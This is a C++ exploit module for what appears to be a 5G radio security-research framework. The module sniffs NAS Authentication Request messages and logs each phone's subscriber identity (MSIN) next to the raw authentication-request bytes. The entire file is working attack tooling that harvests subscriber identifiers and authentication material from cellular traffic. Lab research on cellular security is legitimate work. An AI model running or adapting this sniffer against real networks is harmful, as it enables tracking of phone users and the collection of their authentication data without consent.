#include "shadower/modules/exploit.h"
#include <fstream>
#include <iomanip>
#include <iostream>
#include <sstream>
#include <string>

class AuthenticationRequestSniffer : public Exploit
{
public:
  AuthenticationRequestSniffer(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                               SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_) :
    Exploit(dl_buffer_queue_, ul_buffer_queue_)
  {
  }

  void setup() override
  {
    f_authentication_request = wd_filter("nas_5gs.mm.message_type == 0x56");
    f_mac_nr                 = wd_field("mac-nr");
    f_msin                   = wd_field("nas_5gs.mm.suci.msin");
  }

  void pre_dissection(wd_t* wd) override
  {
    wd_register_filter(wd, f_authentication_request);
    wd_register_field(wd, f_mac_nr);
    wd_register_field(wd, f_msin);
  }

  void post_dissection(wd_t*                 wd,
                       uint8_t*              buffer,
                       uint32_t              len,
                       uint8_t*              raw_buffer,
                       uint32_t              raw_buffer_len,
                       direction_t           direction,
                       uint32_t              slot_idx,
                       srslog::basic_logger& logger) override
  {
    wd_field_info_t msin_info = wd_read_field(wd, f_msin);
    if (msin_info) {
      msin = packet_read_field_string(msin_info);
      logger.info("Received UE identity MSIN: %s", msin.c_str());
    }

    if (wd_read_filter(wd, f_authentication_request)) {
      wd_field_info_t mac_nr_info = wd_read_field(wd, f_mac_nr);
      if (!mac_nr_info) {
        logger.error("Failed to read MAC-NR field");
        return;
      }
      std::ostringstream oss;
      uint16_t           offset = packet_read_field_offset(mac_nr_info);
      oss << "{";
      for (uint32_t i = offset; i < len; i++) {
        oss << "0x" << std::setfill('0') << std::setw(2) << std::hex << static_cast<int>(buffer[i]) << ", ";
      }
      oss << "};";
      logger.info("MSIN: %s  Auth Request: %s", msin.c_str(), oss.str().c_str());
    }
  }

private:
  wd_filter_t f_authentication_request;
  wd_field_t  f_msin;
  wd_field_t  f_mac_nr;
  std::string msin;
};

extern "C" {
__attribute__((visibility("default"))) Exploit* create_exploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                                                               SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_)
{
  return new AuthenticationRequestSniffer(dl_buffer_queue_, ul_buffer_queue_);
}
}